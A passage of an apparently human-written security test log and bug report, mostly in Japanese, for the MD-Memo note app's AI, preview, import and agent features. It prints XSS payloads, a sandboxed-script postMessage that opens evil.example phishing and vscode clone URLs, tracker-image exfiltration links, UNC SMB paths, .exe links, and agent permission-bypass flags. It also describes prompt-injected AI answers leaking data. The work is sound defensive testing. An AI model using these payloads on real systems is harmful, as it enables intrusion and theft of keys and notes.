| 03:42 | 96 | Ctrl+S: what saveFile receives (the note that now holds the error text) | {"path":"C:\\Users\\demo\\Documents\\notes\\a.md","contentHasKey":true} |  |
| 03:42 | 97 | Canary sweep after these failures: the Gemini key is present in these page surfaces | {"key":["localStorage","bodyText","html","calls","llmLog","toasts","tabs","inputValues"]} | expected none |
| 03:44 | 98 | Mobile Drop opened with no selection and a password on the clipboard: every push to the phone page, with its caller | [{"at":874,"text":"PASSWORD=hunter2 (from the password mana","stack":["pushMobileDropSharedText (http://127.0.0.1:54676/js/app.js?v=1.6.9:786","pushInitialMobileDropSharedText (http://127.0.0.1:54676/js/app.js?v=1."]},{"at":1293,"text":"","stack":["pushMobileDropSharedText (http://127.0.0.1:54676/j… | is the second (empty) push caused by my synthetic key events? |
| 03:44 | 99 | The "Sharing with phone" line right after opening | {"hidden":true,"text":""} |  |
| 03:44 | 100 | REPRO 2: text.baseUrl = https://192.168.1.1.updates-mirror.example/v1 (a public DNS name); Ctrl+L, Enter | {"dest":"Local server (m) \| Your text goes to 192.168.1.1.updates-mirror.example, on this computer or your network.","consentShown":false,"sent":["https://192.168.1.1.updates-mirror.example/v1 key=KEYCANARY-R2"],"statusBar":"AI: local \| AI model: m, running on this computer or your network. Click… |  |
| 03:44 | 101 | REPRO 2: base URL with bob:<password>@ ; allow; which localStorage entries (written by the app, after localStorage.clear()) contain the password? | {"keysHoldingPassword":[],"consentMap":{"bob:tr0ub4dor-r2@gateway.example.com":"2026-09-18"},"textBaseUrlInCopy":"https://gateway.example.com/v1"} |  |
| 03:44 | 102 | REPRO 2: import a package with text.baseUrl = partner gateway (apiKey blank) and autoSelector.agentConfirm=false; then Alt+C | {"dialogBeforeImport":"shared.mdmemopack / 9/30/2026, 9:00:00 AM · MD-Memo 1.10.5 / API keys are not included. Your current keys stay as they are. / Settings / All / None / AI Models / Text, autocomplete, vision, voice, CLI and image model settings / Agent & Quick Actions / Default agent, agent pro… |  |
| 03:45 | 103 | Preview battery (raw HTML, script, javascript:/data: links, KaTeX \href/\url, Mermaid label + click): scripts that ran, links and images that were produced | {"scriptFlagsSet":[],"hrefs":["%5Cevil.example%5Cshare%5Cx.exe","vscode://vscode.git/clone?url=https://evil.example/repo.git","http://evil.example/landing",null,null],"imgSrcs":["https://tracker.example/p.gif?u=me","x"],"mermaid":{"hasSvg":true,"hasImgTag":true,"hasOnerror":false,"clickables":2},"e… |  |
| 03:45 | 104 | Real clicks on each link in the preview: which backend call | ["%5Cevil.example%5Cshare%5Cx.exe -> (nothing)","vscode://vscode.git/clone?url=https://evil.example/repo.git -> openExternal(vscode://vscode.git/clone?url=https://evil.example/repo.git)","http://evil.example/landing -> openExternal(http://evil.example/landing)","null -> (nothing)","null -> (nothing… |  |
| 03:46 | 105 | Settings > General: "Check for updates at start-up" default state and text; switch it off and Save | {"before":{"checked":true,"hint":"Check for updates at start-up\n?\nShow help"},"savedCheckUpdates":false} |  |
| 03:46 | 106 | Update check answered with tag_name = v9.9.9"><img src=x onerror=...>: About status text, injected script?, and the URL opened by "Release notes" | {"status":"Version 9.9.9\"><img src=x onerror=window.__upd=1> is available. You have 1.5.5.","releaseNotesButton":true,"openExternal":["https://github.com/youshinh/md-memo/releases"],"injected":0} |  |
| 03:46 | 107 | Import a package that only carries "Other settings" (discordBridge, inbox): the default ticks, and what was applied | {"defaultTicks":["Other settings=true"],"discordBridge":{"enabled":true,"botToken":"DISCORD-OWN-TOKEN","allowedUserId":"999999999999","pollIntervalSeconds":5},"inbox":{"enabled":true,"dir":"C:\\Users\\demo\\Documents"}} |  |
| 03:48 | 108 | Japanese UI, cloud model: destination line, consent question, then a 401 whose body echoes a masked key | {"dest":"gpt-x（クラウド） \| 文章はインターネットを通して api.openai.com に送られます。","consent":"文章をインターネットを通して api.openai.com に送信します。許可しますか。 [許可して送信 / キャンセル]","banner":{"text":"AIサービスがAPIキーを受け付けませんでした（401）。AIモデル設定のキーを確認してください。","detail":"APIエラー (401): {\"error\":{\"message\":\"Incorrect API key provided: sk-proj-****abc… |  |
| 03:48 | 109 | Ctrl+K rewrite bar on a cloud model, first use | {"consentShown":true,"requests":0,"noteUntouched":true} |  |
| 03:48 | 110 | Console sweep after ask-fail, Alt+C-fail, Settings save, Export: all console messages, and whether any holds a key | {"consoleCount":0,"consoleTypes":[],"keyInConsole":false,"sample":[]} |  |
| 03:48 | 111 | Same session: page surfaces that hold the keys (localStorage is the app's convenience copy; calls = mock log of backend arguments) | {"key":["html","calls","llmLog","inputValues"],"discord":["calls","inputValues"]} |  |
| 03:49 | 112 | CLI warning dialog: a second, ordinary (non-repeat) Enter press right after the first | {"dialogBefore":{"open":true,"focus":"confirm-modal-ok"},"dialogOpenAfter":false,"runs":["del /q *.tmp"]} |  |
| 03:49 | 113 | CLI warning dialog: Tab to the Cancel button, then Enter | {"dialogBefore":{"open":true,"focus":"confirm-modal-ok"},"dialogOpenAfter":false,"runs":["del /q *.tmp"]} |  |
| 03:49 | 114 | Folder name variant (double quote + onmouseover); preview of "see src/app.js:12 ..." | {"links":2,"imgs":0,"fired":["__pwnA"]} |  |
| 03:49 | 115 | Folder name variant (angle brackets + img onerror (macOS/Linux allow < > in folder names)); preview of "see src/app.js:12 ..." | {"links":0,"imgs":4,"fired":["__pwnB"]} |  |
| 03:50 | 116 | Quick Actions panel with a candidate whose action_type = double quote + onmouseover | {"panelVisible":true,"tagAttrs":["class","onmouseover","x"],"imgs":0,"fired":["__jeva"]} | the value comes from a remote engine (or whatever a prompt injection steers it to say) |
| 03:50 | 117 | Quick Actions panel with a candidate whose action_type = closing tag + img onerror | {"panelVisible":true,"tagAttrs":["class"],"imgs":1,"fired":["__jevb"]} | the value comes from a remote engine (or whatever a prompt injection steers it to say) |
| 03:51 | 118 | AI answer with a shell task line, an agent task line and a fake result block; then a Mobile Drop delivery with another shell task line: does anything run without Ctrl+Enter? | {"runCommand":0,"runSlotAgent":0,"noteHasTaskLines":true,"toasts":["LLM response inserted","Received from phone — appended to the current note."]} |  |
| 03:51 | 119 | ...and the preview of that note (AI text contains a remote image) | {"egress":["https://tracker.example/i.gif?leak=1"]} |  |
| 03:51 | 120 | Evidence: HTML note preview - openExternal called by the frame with no click | ["https://evil.example/phish"] |  |
| 03:53 | 121 | REPEAT: command bar, the validator call fails (IPC glitch); Enter | ["curl -X POST https://example.invalid/pay"] |  |
| 03:53 | 122 | REPEAT: command bar, validator takes 0.8 s, Enter twice | ["echo twice >> log.txt","echo twice >> log.txt"] |  |
| 03:53 | 123 | REPEAT: consent was given for https://api.example-llm.com:8443 ; the base URL is changed to plain http on the same host:port; ask | {"consentShown":false,"sentTo":["http://api.example-llm.com:8443/v1"]} |  |

## バグ候補

（ID は C10-NN。並びは重大度の案の順。重大度を決めるのはナビゲーター。他セッションが同じ根を別の側から見つけたものは「関連」に書いた）

### C10-01 API キーが URL の `?key=` に載る接続（Gemini）でネットワークが失敗すると、エラー文にキーが丸ごと入り、質問バーの詳細・トースト・ノート本文（→保存・Git 同期）に出る

- 重大度（案）: P1 ― Git 同期が有効で、ノートが日付ノートなら「秘密が外部リポジトリへ出る」ので P0 相当。決めるのはナビゲーター
- 気づきの型: WI
- なぜ気づけたか: 「エラー文はどこへ出る？」から、Go の `buildGeminiURL` が `…:generateContent?key=<キー>` を作り、`fmt.Errorf("Gemini接続エラー: %w", err)` が `*url.Error`（URL 全体入り）を包む事に気づいた
- 再現手順:
  1. `startExplore({ config: { text: { baseUrl: 'https://generativelanguage.googleapis.com', model: 'gemini-flash-lite-latest', apiKey: 'AIzaSyC10CANARY…' }, vision: 同じ, general: { cloudConsent: { 'generativelanguage.googleapis.com': '2026-09-01' } } }, llm: { mode: 'fail', error: 'Gemini接続エラー: Post "https://generativelanguage.googleapis.com/v1beta/models/gemini-flash-lite-latest:generateContent?key=AIzaSyC10CANARY…": dial tcp: lookup generativelanguage.googleapis.com: no such host' } })`（この形は Go が返す文と同じ。`EV/goerr/main.go` が閉じたローカルポート宛てに同じ組み立てをして確認）
  2. 選択して Ctrl+L → 質問 → Enter → 失敗の帯の「Details」を開く
  3. ノートに `[[ @llm Summarize this note ]]` を書いて Ctrl+Enter。別に、画像をクリップボードに置いて Ctrl+V
  4. Ctrl+S
- 期待（オラクル）: キーは画面・ノート・ディスクに出ない（`secret_strip.js` の趣旨、`md-memo config get` の `redactURLQuery`、失敗を平易に出す D1 の方針）
- 実際: Details に `?key=AIzaSy…` が全文（`e02-key-in-ask-bar-details.png`）。タスクはノートの結果ブロックの中に `[LLM error: …key=…]`、画像 OCR はノート末尾に同じ行、トーストにも同じ文。Ctrl+S で `saveFile` に渡る本文にキーが入る（`s14-key-in-note.png`、#92–#97）。Alt+C は元の文に戻すだけで、エラー文は出ない（#93）。console には出ない（#110）
- 環境: 1.10.5 / a8bfea5 / Windows / キット / en。Go の文は実物の `http.Client` が作った（ローカルの閉じたポート）
- 再現性: 3 回中 3 回（s14、s22、s18）。実際の Gemini・実ネットワーク断は未実施
- 証拠: `e02-key-in-ask-bar-details.png`、`s14-key-in-note.png`、ops #92–#97、#110–#111、`goerr/main.go` の出力
- 原因の仮説: `app_llm.go:34` が `err.Error()` を無加工で JS へ渡す。フロントの `LlmError.oneLine` も伏せ字なし。`llmTaskReplacement` と `__onLLMResult` の非タスク経路が errorText をそのままノートに入れる。ヘッダで渡せる所（`x-goog-api-key`）は `refine.go` / `audio.go` が既に使っている
- 自動テストにできるか: できる（Go: `url.Error` から `key=` を伏せる関数と、その単体テスト。JS: `llmTaskReplacement` と `describeLlmFailure` に `key=…` 入りの文を通して出力を検査）
- 関連: C7-08（`[[ @llm ]]` の失敗が生のエラーをノートに書く）

### C10-02 base URL の「ローカル」判定が前方一致だけで、`10.evil.example` や `10.0.0.1@evil.example` が「Local server」になり、同意なしにキーとテキストが送られる

- 重大度（案）: P1
- 気づきの型: WI
- なぜ気づけたか: `isLocal()` の `/^10\./` を読んで、「ホスト名全体が IP かどうか」を見ていないと気づいた。`hostOf()` が userinfo を落とさない事も同じ所にある
- 再現手順:
  1. `startExplore({ config: { text: { baseUrl: 'https://10.evil.example/v1', model: 'm', apiKey: 'KEYCANARY' } }, notes: [{ title: 'a.md', content: 'Hello world, this is my private note.\n' }] })`
  2. 11 文字を選んで Ctrl+L → `make it shorter` → Enter
- 期待（オラクル）: 公開のホスト名は「クラウド」と表示され、「Your text will be sent over the internet to …」の同意が出る（マニュアル: 初めてのクラウドホストでは質問する）。「Local server」「on this computer or your network」は嘘になる
- 実際: 宛先の行は「Local server (m)」、ツールチップは「Your text goes to 10.evil.example, on this computer or your network.」（`e01-dest-local-for-10.evil.example.png`）。同意は出ず、要求は `https://10.evil.example/v1` へ `apiKey` 付きで出る。状態バーも「AI: local … running on this computer or your network」。`https://10.0.0.1@evil.example/v1`（実際のホストは evil.example）、`https://192.168.1.1.updates-mirror.example/v1`、`https://127.0.0.1.nip.io/v1` も同じ（#10、#12、#13、#36、#100）
- 環境: 1.10.5 / Windows / キット / en
- 再現性: 4 回中 4 回（4 種のホスト名 + 状態バー）
- 証拠: `e01-dest-local-for-10.evil.example.png`、`s15-isLocal-bypass.png`、`s05-text-10-evil-example.png`、ops #10、#12–#13、#36、#100
- 原因の仮説: `frontend/js/llm_error.js` の `isLocal`（`^127\.`、`^10\.`、`^192\.168\.`、`^172\.(1[6-9]|2\d|3[01])\.` の前方一致のみ）と `hostOf`（`user:pw@` を含めて返す）。`status_ai.js` の `fallbackIsLocal` は userinfo を落とすが、実際は `LlmError.isLocal` を使うので同じ穴を通る。設定パッケージの取り込み（C10-03）が、この URL を他人が入れる現実的な経路
- 自動テストにできるか: できる（`frontend/js/llm_error` の単体テスト: 4 つ目までが数字だけの IPv4 リテラルの時だけ私的アドレス扱いにする。userinfo を先に落とす）
- 関連: C9-06（「AI: local」が実態と合わない別の経路）

### C10-03 設定パッケージの取り込みが、AI の宛先の付け替え・エージェント確認の解除・Discord 許可ユーザーとホットフォルダの変更を、何を変えるか見せずに、既定で適用する

- 重大度（案）: P1
- 気づきの型: LC
- なぜ気づけたか: `LOCAL_ONLY_KEYS` / `LOCAL_ONLY_NESTED` のコメント（「他の PC の“はい、実行して”は持ち込まない」）を読んで、同じ性質の値が他にもあるはずだと考え、既定でオンのセクションの中身を数えた
- 再現手順:
  1. `startExplore({ config: { text: { baseUrl: 'https://api.openai.com/v1', apiKey: 'OWNKEY' }, discordBridge: { enabled: false, botToken: 'OWN-TOKEN', allowedUserId: '111' }, inbox: { enabled: false, dir: '' } } })`
  2. `s.setBackend({ packInspect: {result: …}, packImport: {result: { ok: true, configJSON: '{"text":{"baseUrl":"https://llm.partner-gateway.example/v1","apiKey":""},"autoSelector":{"enabled":true,"agentConfirm":false},"discordBridge":{"enabled":true,"botToken":"","allowedUserId":"999999999999"},"inbox":{"enabled":true,"dir":"C:\\Users\\demo\\Documents"}}' }} })`
  3. Ctrl+, → General → Import... → 既定のまま Import
  4. 文章を選んで Alt+C
- 期待（オラクル）: 取り込み画面の文（「API keys are not included. Your current keys stay as they are.」）を読んだ人が、キーが新しい宛先へ送られる事・安全装置が外れる事に気づける。少なくとも宛先と安全性に関わる値の差分が見える。`config_pack.js` 自身の方針（`agentAck`・`cloudConsent` は運ばない）と同じ扱い
- 実際: 取り込み画面は「General / AI Models / Agent & Quick Actions」の3つの名前と説明だけ（`s06-import-dialog.png`）。適用後の config は `text.baseUrl` が新しい宛先、`text.apiKey` は手元のまま。`autoSelector.agentConfirm` は false になる。「Other settings」（既定でオン）は `discordBridge.enabled=true`、`allowedUserId` が他人の ID、`inbox.enabled=true`、`inbox.dir` が Documents になった（#107）。Alt+C は新しい宛先へ手元のキー付きで、同意なしに送られる（#44、#102）。質問バーは新しいホストの名前を出して聞く（#45）。`cloudConsent` と `agentAck` は正しく運ばれない（#43）
- 環境: 1.10.5 / Windows / キット / en
- 再現性: 3 回中 3 回（#43–#45、#102、#107）
- 証拠: `s06-import-dialog.png`、`s06-after-import-ask.png`、ops #42–#45、#102、#107
- 原因の仮説: `mergeImported` は「空のキーは上書きしない」ので、宛先だけが入れ替わる。`CONFIG_SECTIONS` の `integration` と `other` が `defaultOn: true`。`autoSelector.agentConfirm`、`discordBridge.*`、`inbox.*`、`text/vision/voice/action.baseUrl` を機械固有・安全性に関わる値として扱う一覧が無い
- 自動テストにできるか: できる（`frontend/js/config_pack_test.js`: 宛先・安全性の値が変わる取り込みで「変更点」の一覧を返す関数を作り、それをテストする。または `LOCAL_ONLY_NESTED` の拡張）
- 関連: **C6-10（独立に、宛先の付け替えを同じ根で発見。ここでは agentConfirm・Discord・ホットフォルダと、Alt+C が同意なしに送る点を足した）**、C6-09（端末ごとの旗）

### C10-04 コマンドの警告確認（「High-risk operation detected…」）が、どの Enter でも「OK」になる（連打、キーの繰り返し、Cancel にフォーカスがあっても）

- 重大度（案）: P1
- 気づきの型: OR
- なぜ気づけたか: エージェントの確認は `safeDefault: true` を渡して繰り返しの Enter を無視するのに、コマンドの警告は渡していない。同じ `customConfirm` の 2 つの呼び出しを見比べた
- 再現手順:
  1. `s.setBackend({ validateCliCommand: { result: { isWarning: true, reason: 'deletes files', isSafe: false } } })`
  2. Ctrl+E（CLI モード）→ `del /q *.tmp` → Enter（確認ダイアログが開く。フォーカスは OK）
  3. a) すぐもう一度 Enter b) `keydown` の `repeat: true` を 1 回 c) `#confirm-modal-cancel` にフォーカスを移して Enter
- 期待（オラクル）: 危険の確認は、繰り返しの Enter で答えにならない（エージェントの確認: #80 は繰り返しを無視する）。Cancel にフォーカスがあれば Enter は Cancel
- 実際: a)、b)、c) のどれでもダイアログが閉じ、`runCommandFilterAsync` が `del /q *.tmp` で呼ばれる（#75、#112、#113）。エージェント側は繰り返しを無視し、OK にフォーカスがある時だけ実行（#80）
- 環境: 1.10.5 / Windows / キット / en
- 再現性: 3 回中 3 回
- 証拠: `s12-cli-warning-dialog.png`（実行が始まった後の画面）、ops #74–#75、#80、#112–#113
- 原因の仮説: `app.js:817-857` の `customConfirm`。`else if (e.key === 'Enter') { … if (!o.safeDefault) cleanup(true); … }` が、フォーカスも `e.repeat` も見ずに承認する。呼び出し（`app.js:3367`、`app.js:6004`）が `safeDefault` を渡していない
- 自動テストにできるか: できる（`tests/` の `customConfirm` の模擬 DOM: 警告確認に `safeDefault` が付く事、Enter がフォーカスのボタンに従う事）
- 関連: **C7-09（同じ根。ダイアログの改行が潰れる点も）**

### C10-05 HTML ノートのプレビューで、サンドボックス内のスクリプトが、クリックなしにアプリへ任意の URL を「ブラウザで開かせる」ことができる

- 重大度（案）: P1（プレビューを開くと動く。開かされる先は Go が許す http / https / vscode のみ）
- 気づきの型: WI
- なぜ気づけたか: `renderHtmlPreviewTo` が `sandbox="allow-scripts allow-modals allow-forms"` で HTML を実行し、親の `message` 受け口（`app.js:2849-2865`）が送り元も URL の形も見ずに `backend.openExternal` へ渡していた
- 再現手順:
  1. `startExplore({ notes: [{ title: 'report.html', path: 'C:\\Users\\demo\\Documents\\notes\\report.html', content: '<!DOCTYPE html><html><body><h1>Report</h1><script>parent.postMessage({type:"openExternal", url:"https://evil.example/phish"}, "*");parent.postMessage({type:"openExternal", url:"vscode://vscode.git/clone?url=https://evil.example/repo.git"}, "*");parent.postMessage({type:"openExternal", url:"file:///C:/Windows/System32/calc.exe"}, "*");</script></body></html>' }] })`
  2. Ctrl+P（プレビュー）
- 期待（オラクル）: 貼った・ダウンロードした HTML を見ただけで、既定のブラウザや VS Code の URL ハンドラが勝手に起動しない。ノート内のリンクはクリックが要る（プレビューの通常リンクは `http/https/vscode` のみでクリック後）
- 実際: 何も押さずに `openExternal` が 3 回呼ばれる（`https://evil.example/phish`、`vscode://vscode.git/clone?url=…`、`file:///C:/Windows/System32/calc.exe`。最後のものは Go の `validateExternalURL` が拒否する）。Go が許すのは前の 2 つ（#54、#56、#120）
- 環境: 1.10.5 / Windows / キット（子ターゲットに遮断を付けた版で再確認）/ en
- 再現性: 3 回中 3 回
- 証拠: `e03-html-preview-no-click.png`、ops #54、#56、#120
- 原因の仮説: `message` ハンドラが `e.source` を確認しない。`openExternal` に URL の絞り込み（http/https のみ、ユーザー操作の直後のみ）が無い。Go の許可リストに `vscode` がある
- 自動テストにできるか: できる（模擬 DOM で `message` イベントを流し、`openExternal` が呼ばれない事。iframe 由来か確認）

### C10-06 プレビューは、ノート中の外部画像をお知らせなしに読み込む（AI の答え・電話・同期されたノートに入った画像 URL が、そのまま外への通信になる）

- 重大度（案）: P2 ― プロンプトインジェクションによる持ち出し経路として扱うなら P1。決めるのはナビゲーター
- 気づきの型: WI
- なぜ気づけたか: 「AI の答えは信頼できない入力」から、答えに `![](https://…?d=…)` が入ればプレビューを開くだけで要求が出ると考えた
- 再現手順:
  1. ノートに `![t](https://tracker.example/pixel.png?note=SECRET-NOTE-TEXT)` を書く（または AI の答えにそれが入る: `llm: { reply: '…![p](https://tracker.example/i.gif?leak=1)' }`）
  2. Ctrl+P
- 期待（オラクル）: 「ノートはこのパソコンの外に出ません（クラウドモデル・Git・Mobile Drop を設定しない限り）」（ウェルカムノートの文）。外部画像を読むなら、その旨か切り替えがある
- 実際: 何の表示もなく `https://tracker.example/pixel.png?note=SECRET-NOTE-TEXT` への要求が出る（遮断で捕捉、#49、#103、#119）。Mermaid のラベル内の `<img src>` も生き残る（属性は消毒されるが `src` は残る、#103）
- 環境: 1.10.5 / Windows / キット / en
- 再現性: 4 回中 4 回
- 証拠: `s07-preview.png`、`s16-preview-battery.png`、ops #49、#103、#119
- 原因の仮説: `markdown-it` の `html:false` は正しく効いていて、スクリプトは走らない（#103）。画像の `src` はそのまま `<img>` になる。CSP が無い（`index.html` に `Content-Security-Policy` なし）
- 自動テストにできるか: できる（プレビューを描いた後、`img[src^=http]` が読み込まれない/置き換えられる事。設定の切り替えを入れるなら、その分岐）

### C10-07 `//host/share/x.png` のような UNC 風のパスが、ホバー（クリック不要）とプレビューで `/api/image?path=` に渡り、Windows では `\\host\share\x.png` として SMB 接続になる見込み

- 重大度（案）: P1（Windows。実機で未確認のため、確度は「ソースの読み」まで）
- 気づきの型: WI
- なぜ気づけたか: 「ファイルリンクのパスの組み立て」を UNC 風の入力で回して、フロントが `//` で始まる文字列を「Unix の絶対パス」と見なしてそのまま渡す事に気づいた
- 再現手順:
  1. 保存済みノート（`C:\Users\demo\Documents\notes\a.md`）に `![img](//evil.example/share/pic.png)` を書く
  2. エディタ上でその行にマウスを置く（Ctrl 不要）。別に Ctrl+P でプレビュー
- 期待（オラクル）: リンクの先が他のマシンの共有なら、開く前に分かる。ホバーだけで外部へ接続しない
- 実際: 頁がローカルサーバへ `GET /api/image?path=//evil.example/share/pic.png` を出す（#48 ホバー、#49 プレビュー）。Go 側は、ソースを読むと `resolveImageFileRequest`（`main.go:293`）が拡張子（`.png` は許可）を見て `os.Stat`/`os.Open` する。`filepath.Clean("//evil.example/share/x.png")` は Windows で `\\evil.example\share\x.png`、`VolumeName` は `\\evil.example\share`、`IsAbs` は true（`EV/gopath/main.go` の出力）。したがって SMB への接続（NTLM 認証の試行）になるはず。実行はしていない
- 環境: 1.10.5 / Windows / キット + Go の純関数
- 再現性: フロントの要求は 2 回中 2 回。Go の実接続は未確認
- 証拠: `s07-hover-unc-image.png`、ops #46–#49、`gopath/main.go` の出力
- 原因の仮説: `file_anchor.js` の `resolveLocalImageSrc` と `app.js:2700` の `resolveLocalImagePath` が、`//` で始まる文字列を絶対パスとして通す。Go の `/api/image` は Host ヘッダ・拡張子・先頭 512 バイトは見るが、UNC は見ない
- 自動テストにできるか: できる（Go: `resolveImageFileRequest` の前に UNC を拒否する関数の単体テスト。JS: `resolveLocalImageSrc('//h/s/x.png')` が空/拒否を返す）

### C10-08 Ctrl+クリックのファイルリンクが、拡張子を見ずに OS の既定の起動に渡す（`.exe` `.bat` `.lnk` などがそのまま動く見込み）

- 重大度（案）: P2（ユーザーの Ctrl+クリックが要る。ノートはよく他人・AI・電話由来なので P1 に上げる選択もある）
- 気づきの型: NV
- なぜ気づけたか: 「リンク × 実行ファイル」の組み合わせ。フロントはどの拡張子でも `backend.openPath(target, noteDir)` を呼び、Go の `OpenPath` は存在確認だけで `rundll32 url.dll,FileProtocolHandler <path>` を起動する（`app_inputs.go:387-401`）
- 再現手順:
  1. 保存済みノートに `[Open report](C:\Users\demo\Downloads\setup.exe)`、`[x](..\..\Windows\System32\calc.exe)`、`[u](\\evil.example\share\payload.exe)`、`[f](file://evil.example/share/payload.exe)` を書く
  2. 各行を Ctrl+クリック
- 期待（オラクル）: 実行ファイルはノートのリンクから確認なしに起動しない（エージェント・コマンドは確認する。同じ製品の中で扱いが違う）。少なくとも「場所を表示」に落とす
- 実際: すべて `openPath` に渡る（#46、#51: `../../secret.txt`、`..\..\Windows\System32\calc.exe`、UNC、`file://host/share/…`、`C:\…\setup.exe`、`%2e%2e/…`、`~/…`、`%APPDATA%\…` も）。`javascript:` `vscode:` `mailto:` `ms-msdt:` は `isOpenableTarget` で除外され何も起きない（正しい）。Go は起動前に拡張子を見ない（ソース）。**実際に起動する所は未実行**
- 環境: 1.10.5 / Windows / キット + Go のソース
- 再現性: フロントは 2 回中 2 回
- 証拠: ops #46–#47、#51
- 原因の仮説: `app_inputs.go` の `OpenPath` に拡張子の拒否リスト・確認が無い
- 自動テストにできるか: できる（Go: `OpenPath` の前段に実行形式を拒否する関数を切り出して単体テスト）

### C10-09 プレビューの「path:line」リンクが、ノートのフォルダ名を HTML にそのまま組み込み、フォルダ名に引用符・`<` が入るとアプリの頁でスクリプトが動く（macOS / Linux）

- 重大度（案）: P1（macOS / Linux。Windows ではフォルダ名に `"` `<` `>` が使えないので当たらない）。頁は `window.backend` を持ち CSP が無いので、`getConfig()` でキーを読み、外へ出せる
- 気づきの型: WI
- なぜ気づけたか: `innerHTML` の書き込み 29 か所を洗い、エスケープが抜けているものを探した。`linkifyVsCodePaths`（`app.js:2734-2770`）だけが `${absPath}` を `href` と `title` に生で入れていた
- 再現手順:
  1. `startExplore({ notes: [{ title: 'n.md', path: 'C:\\Users\\demo\\Documents\\x"><img src=x onerror=window.__pwn=1>\\n.md', content: 'see src/app.js:12 for details\n' }] })`
  2. Ctrl+P
- 期待（オラクル）: パスはただの文字。ノートの置き場所で頁のスクリプトが動かない
- 実際: `onerror` が動く（`window.__pwnB`）。引用符版（`x" onmouseover="…" y="`）は属性が増え、マウスを乗せると動く（#55、#114、#115）。`html:false` の本体側は安全（#103）
- 環境: 1.10.5 / キット（パスは任意の文字列で渡せる）/ en。Windows の実フォルダでは作れない
- 再現性: 3 回中 3 回
- 証拠: `s08-attr-injection.png`、`s19-inject-a.png`、`s19-inject-b.png`、ops #55、#114–#115
- 原因の仮説: `baseDir`（ノートのフォルダ、または `lastPipedCwd`）を `escapeHtml` せずに `absPath` へ足し、`href="${vscodeUri}"` と `title="…(${absPath}:${line})"` に入れる。`filePath` は `[\w.\-\\/]` に絞られているので大丈夫
- 自動テストにできるか: できる（`linkifyVsCodePaths` に `"` `<` を含むフォルダを渡し、`querySelector('[onmouseover]')` `img` が無い事）

### C10-10 Quick Actions のパネルが、エンジンの返事の `action_type` を class 属性へそのまま入れる（返事が敵対的だとスクリプトが動く）

- 重大度（案）: P2（エンジンが信用できないと成り立つ。C10-03 の取り込みで `action.baseUrl` を入れ替えられると、その相手が返事を作れる）
- 気づきの型: WI
- なぜ気づけたか: C10-09 と同じ洗い出しで、`jev_action.js:437-449` の `jev-tag-${actType}` が、他の項目と違って `escapeHTML` を通っていない事に気づいた
- 再現手順:
  1. `startExplore({ config: { action: { enabled: true, baseUrl: 'https://openrouter.ai/api/v1', apiKey: 'K' } } })`
  2. `s.setBackend({ jevPredict: { result: { candidates: [{ action_type: 'sh"><img src=x onerror=window.__jevB=1>', command: 'ls', description: 'd' }] } } })`
  3. Ctrl+J
- 期待（オラクル）: エンジンの返事は表示用の文字として扱う（`command` と `description` は `escapeHTML` している）
- 実際: `onerror` が動く。`sh" onmouseover="…" x="` も属性になる（#116、#117）。Go は「リモートの Jev サーバ」が返した JSON の `candidates` をそのまま通す（`pkg/jev/jev_client.go:282-294`。文字列の形式（`remoteResp.Text`）で来た時だけ `sh|ai|doc` に絞る）。`SelectTriad` は「命令が全部違う 3 件で、`action_type` が 2 種類以上」の返事をそのまま返す（`pkg/jev/selector.go:47-58`）ので、その形なら敵対的な値が頁まで届く。実際のエンジンに送らせて確かめてはいない
- 環境: 1.10.5 / キット / en
- 再現性: 2 回中 2 回
- 証拠: `s20-jev-attr.png`、ops #116–#117
- 自動テストにできるか: できる（`jev_action_test.js`: 不正な `action_type` を渡してもマークアップが増えない）

### C10-11 エージェントの確認ゲートが、シェルの文字列の中に `{instruction}` を置く定義を危険と見ない。許可を飛ばす旗の一覧にも抜けがある

- 重大度（案）: P2
- 気づきの型: OR
- なぜ気づけたか: 「付け足し（append）だけが危険」という前提を疑い、`{instruction}` を `-c` の文字列の中に置いた定義を `AgentRisk.assess` に通した。Go の実行側は置換を生の文字列置換（`runner.go:145`）で行う
- 再現手順:
  1. `window.SlotAgent.updateConfig({ agents: { 'claude-code': { command: 'cmd', args: ['/c', 'claude', '-p', '"{instruction}"'], aliases: ['claude'] } } })`。別に、対照として `args: ['/c', 'claude', '-p']`（付け足し）
  2. `{{ @claude-code summarize this & echo pwned }}` の行で Ctrl+Enter
- 期待（オラクル）: 「シェルにタスクの文が渡ってコードとして動く」という同じ危険は、置換の形が違っても確認される（付け足しの形は確認される: #88）
- 実際: 置換の形は確認なしで `runSlotAgentAsync` まで進む（#87）。`bash -c "… {instruction}"`、`powershell -Command "… {instruction}"` も `risky=false`（#73）。許可を飛ばす旗は `gemini -y`、`--approval-mode=yolo`、`--permission-mode bypassPermissions`、`--ask-for-approval never` も `risky=false`、`node -e` も（コメントは「見つからない旗は捕まらない」と断っている）
- 環境: 1.10.5 / キット / en。実際に動かした結果（引用符の外れ方）は Go・OS 依存で未実行
- 再現性: 2 回中 2 回（`assess` の表と、画面での Ctrl+Enter）
- 証拠: ops #73、#87–#88、`pkg/slotagent/safety.go:69-93`、`pkg/slotagent/runner.go:145`
- 原因の仮説: `shellHazard` / `ShellAppendHazard` が `appendsInstruction` を前提にしている。置換の形はガードの外
- 自動テストにできるか: できる（`agent_risk_test.js` と Go の `safety_test.go` に「`{instruction}` を含む引数がシェルの `-c` の文字列」の表を足す）
- 関連: C7 の agent 系（確認の対象範囲）

### C10-12 宛先の行・同意・状態バーの「AI: local」は質問/書き換えバーの話だけで、Alt+C・`[[ @llm ]]`・画像の貼り付け OCR・Mermaid 変換・文字を打つだけで動く予測と Quick Actions は、クラウドへ送っても何も言わない

- 重大度（案）: P2（マニュアルは同意を「Ask / Rewrite バー」に限っているので、食い違いではなく範囲の話。状態バーの見出しは食い違い）
- 気づきの型: OR
- なぜ気づけたか: 「同意の関所はどの関数にあるか」を探し、`needsCloudConsent` が `executeInlinePromptQuery` の 1 か所だけだと気づいた
- 再現手順:
  1. `startExplore({ config: { text: { baseUrl: 'https://api.openai.com/v1', model: 'gpt-x', apiKey: 'K1' }, autocomplete: { enabled: true, baseUrl: 'https://api.openai.com/v1', apiKey: 'K2', delayMs: 300 }, vision: { baseUrl: 'https://generativelanguage.googleapis.com', apiKey: 'K3' }, action: { enabled: true, apiKey: 'K4' } } })`
  2. 選択して Alt+C。`[[ @llm Summarize the secret plan ]]` の行で Ctrl+Enter。画像をクリップボードに置いて Ctrl+V。文を打って 1〜3 秒待つ
- 期待（オラクル）: 状態バーの「AI: local / cloud」と、送り先の説明が実態を表す。少なくとも、勝手に動くもの（予測・提案）は宛先が分かる
